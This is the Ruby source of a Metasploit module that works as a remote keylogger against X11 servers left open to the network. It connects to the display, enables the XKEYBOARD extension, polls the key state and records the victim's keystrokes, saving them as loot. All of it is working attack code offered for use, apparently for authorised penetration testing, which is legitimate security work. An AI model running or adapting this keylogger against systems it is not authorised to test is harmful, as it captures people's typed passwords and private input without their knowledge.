##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Exploit::Remote::Tcp
  include Rex::Proto::X11
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::X11

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'X11 Keylogger',
        'Description' => %q{
          This module binds to an open X11 host to log keystrokes. This is a fairly
          close copy of the old xspy c program which has been on Kali for a long time.
          The module works by connecting to the X11 session, creating a background
          window, binding a keyboard to it and creating a notification alert when a key
          is pressed.

          One of the major limitations of xspy, and thus this module, is that it polls
          at a very fast rate, faster than a key being pressed is released (especially before
          the repeat delay is hit). To combat printing multiple characters for a single key
          press, repeat characters arent printed when typed in a very fast manor. This is also
          an imperfect keylogger in that keystrokes arent stored and forwarded but status
          displayed at poll time. Keys may be repeated or missing.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # MSF module, X11 libs
          'nir tzachar' # original file? https://gitlab.com/kalilinux/packages/xspy/-/blob/kali/master/Xspy.c?ref_type=heads
        ],
        'References' => [
          [ 'URL', 'https://www.kali.org/tools/xspy/'],
          [ 'CVE', '1999-0526']
        ],
        'DefaultOptions' => {
          'RPORT' => 6000
        },
        'DisclosureDate' => '1997-07-01', # CVE date, but likely older
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [],
          'AKA' => ['xspy'],
          'RelatedModules' => [
            'auxiliary/scanner/x11/open_x11',
          ]
        }
      )
    )
    register_options [
      OptInt.new('LISTENER_TIMEOUT', [ true, 'The maximum number of seconds to keylog', 600 ]), # 10 minutes
      OptInt.new('PRINTERVAL', [ true, 'The interval to print keylogs in seconds', 60 ]) # 1 minutes
    ]
  end

  def check
    vprint_status('Establishing TCP Connection')
    connect # tcp connection establish
    vprint_status('Attempting X11 connection')
    connection = x11_connect

    if connection.nil?
      return Exploit::CheckCode::Safe('No connection, or bad X11 response received')
    end

    if connection.header.success == 1
      return Exploit::CheckCode::Appears('Successfully established X11 connection')
    end

    Exploit::CheckCode::Safe('X11 connection was not successful')
  end

  # This function takes map data and converts it to a hashtable so that
  # we can translate from x11 key press data to the actual key on the
  # keyboard which was pressed.
  # https://stackoverflow.com/a/28258750 has a good description of keysyms vs keycodes
  def build_sym_key_map(map_data)
    keysym_index = 0
    key_map = {}
    (map_data.min_key_code..map_data.max_key_code).each do |key_code|
      syms = map_data.key_map_array[keysym_index]
      if syms.n_syms == 0
        key_map[key_code] = nil
      else
        sym = map_data.key_map_array[keysym_index].key_sym_array[0]
        begin
          character = sym.chr
          character = '[space]' if character == ' '
        rescue RangeError
          if X11KEYSYM_HASH.key? sym
            character = X11KEYSYM_HASH[sym]
          else
            character = "Unknown key sym: #{sym}"
          end
        end
        key_map[key_code] = character
        # leaving in for debugging purposes
        # puts "i: #{key_code}, keysym_str: #{character}, keysym: #{keysym_index}"
      end
      keysym_index += 1
    end
    key_map
  end

  # TBH still don't really understand exactly how this works, but it does.
  def translate_keystroke(bit_array_of_keystrokes, key_map, last_key_press_array)
    # Iterate through each byte of keyboard state
    bit_array_of_keystrokes.each_with_index do |keyboard_state_byte, byte_index|
      next if last_key_press_array[byte_index] == keyboard_state_byte

      # Check each bit within the byte
      8.times do |j|
        next unless keyboard_state_byte & (1 << j) != 0

        # Key at position (i*8 + j) is pressed
        keycode = byte_index * 8 + j

        keysym = key_map[keycode]

        @keylogger_log += keysym
        @keylogger_print_buffer += keysym
      end
    end
  end

  def run
    query_extension_call_counter = 0
    @keylogger_log = ''
    @keylogger_print_buffer = ''

    vprint_status('Establishing TCP Connection')
    begin
      connect # tcp connection establish
    rescue Rex::ConnectionError
      fail_with(Msf::Module::Failure::Unreachable, 'Connection failed')
    end
    vprint_status('[1/9] Establishing X11 connection')
    connection = x11_connect

    fail_with(Msf::Module::Failure::UnexpectedReply, 'Port connected, but no response to X11 connection attempt') if connection.nil?

    if connection.header.success == 1
      x11_print_connection_info(connection, datastore['RHOST'], rport)
    else
      fail_with(Msf::Module::Failure::UnexpectedReply, 'X11 connection not successful')
    end

    vprint_status('[2/9] Checking on BIG-REQUESTS extension')
    big_requests_plugin = x11_query_extension('BIG-REQUESTS', query_extension_call_counter)
    fail_with(Msf::Module::Failure::UnexpectedReply, 'Unable to process response') if big_requests_plugin.nil?
    if big_requests_plugin.present == 1
      print_good("  Extension BIG-REQUESTS is present with id #{big_requests_plugin.major_opcode}")
    else
      fail_with(Msf::Module::Failure::UnexpectedReply, 'Extension BIG-REQUESTS is NOT present')
    end

    vprint_status('[3/9] Enabling BIG-REQUESTS')
    toggle = x11_toggle_extension(big_requests_plugin.major_opcode)
    fail_with(Msf::Module::Failure::UnexpectedReply, 'Unable to enable extension') if toggle.nil?

    vprint_status('[4/9] Creating new graphical context')
    gc_header = X11RequestHeader.new(opcode: 55)
    gc_body = X11CreateGraphicalContextRequestBody.new(
      cid: connection.body.resource_id_base,
      drawable: connection.body.screen_root,
      gc_value_mask_background: 1
    )

    gp_header = X11RequestHeader.new(opcode: 20)
    gp_body = X11GetPropertyRequestBody.new(window: connection.body.screen_root)

    sock.put(gc_header.to_binary_s +
             gc_body.to_binary_s +
             gp_header.to_binary_s +
             gp_body.to_binary_s) # not sure why we also do a get property, but it emulates how the library works

    # nothing valuable in the response, just make sure we read it in to
    # confirm its expected data and not leave the response on the socket
    x11_read_response(X11GetPropertyResponse)

    vprint_status('[5/9] Checking on XKEYBOARD extension')
    xkeyboard_plugin = x11_query_extension('XKEYBOARD', query_extension_call_counter)
    fail_with(Msf::Module::Failure::UnexpectedReply, 'Unable to process response') if xkeyboard_plugin.nil?
    if xkeyboard_plugin.present == 1
      print_good("  Extension XKEYBOARD is present with id #{xkeyboard_plugin.major_opcode}")
    else
      fail_with(Msf::Module::Failure::UnexpectedReply, 'Extension XKEYBOARD is NOT present')
    end

    vprint_status('[6/9] Enabling XKEYBOARD')
    toggle = x11_toggle_extension(xkeyboard_plugin.major_opcode, wanted_major: 1)
    fail_with(Msf::Module::Failure::UnexpectedReply, 'Unable to enable extension') if toggle.nil?

    vprint_status('[7/9] Requesting XKEYBOARD map')
    sock.put(X11GetMapRequest.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
                                  full_key_types: 1,
                                  full_key_syms: 1,
                                  full_modifier_map: 1).to_binary_s)

    map_data = x11_read_response(X11GetMapResponse)

    vprint_status('[8/9] Enabling notification on keyboard and map')
    sock.put(X11SelectEvents.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
                                 affect_which_new_keyboard_notify: 1,
                                 affect_new_keyboard_key_codes: 1,
                                 affect_new_keyboard_device_id: 1).to_binary_s +
             X11SelectEvents.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
                                 affect_which_map_notify: 1,
                                 affect_map_key_types: 1,
                                 affect_map_key_syms: 1,
                                 affect_map_modifier_map: 1,
                                 map_key_types: 1,
                                 map_key_syms: 1,
                                 map_modifier_map: 1).to_binary_s) # not sure what this does, but emulates x11 c library
    # this request doesn't receive any response data

    vprint_status('[9/9] Creating local keyboard map')
    key_map = build_sym_key_map(map_data)
    last_key_press_array = Array.new(32, 0)
    empty = Array.new(32, 0)

    print_good('All setup, watching for keystrokes')
    # loop mechanics stolen from exploit/multi/handler
    stime = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    print_timer = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    timeout = datastore['LISTENER_TIMEOUT'].to_i
    printerval = datastore['PRINTERVAL'].to_i
    begin
      loop do
        # sleep 1
        break if timeout > 0 && (stime + timeout < Process.clock_gettime(Process::CLOCK_MONOTONIC))

        sock.put(X11QueryKeyMapRequest.new.to_binary_s)
        query_key_map_response = x11_read_response(X11QueryKeyMapResponse)
        bit_array_of_keystrokes = query_key_map_response.data
        # we poll FAR quicker than a normal key press, so we need to filter repeats
        unless bit_array_of_keystrokes == last_key_press_array # skip repeats
          translate_keystroke(bit_array_of_keystrokes, key_map, last_key_press_array) unless bit_array_of_keystrokes == empty
          last_key_press_array = bit_array_of_keystrokes
        end

        next unless print_timer + printerval < Time.now.to_f

        print_timer = Time.now.to_f
        if @keylogger_print_buffer.empty?
          print_bad('No X11 key presses observed')
          next
        end
        print_good("X11 Key presses observed: #{@keylogger_print_buffer}")
        @keylogger_print_buffer = ''
      end
    rescue EOFError
      print_error('Connection closed by remote host')
    ensure
      vprint_status('Closing X11 connection')
      sock.put(Rex::Proto::X11::X11RequestHeader.new(opcode: 60).to_binary_s +
        X11FreeGraphicalContextRequestBody.new(gc: connection.body.resource_id_base).to_binary_s +
        Rex::Proto::X11::X11RequestHeader.new(opcode: 43).to_binary_s +
        X11GetInputFocusRequestBody.new.to_binary_s)
      disconnect

      if @keylogger_print_buffer.empty?
        print_bad('No X11 key presses observed')
      else
        print_good("X11 Key presses observed: #{@keylogger_print_buffer}")
      end

      unless @keylogger_log == ''
        loot_path = store_loot(
          'x11.keylogger',
          'text/plain',
          datastore['rhost'],
          @keylogger_log,
          'xspy.txt',
          'Keylogger content from X11'
        )

        print_good("Logged keys stored to: #{loot_path}")
      end
    end
  end
end
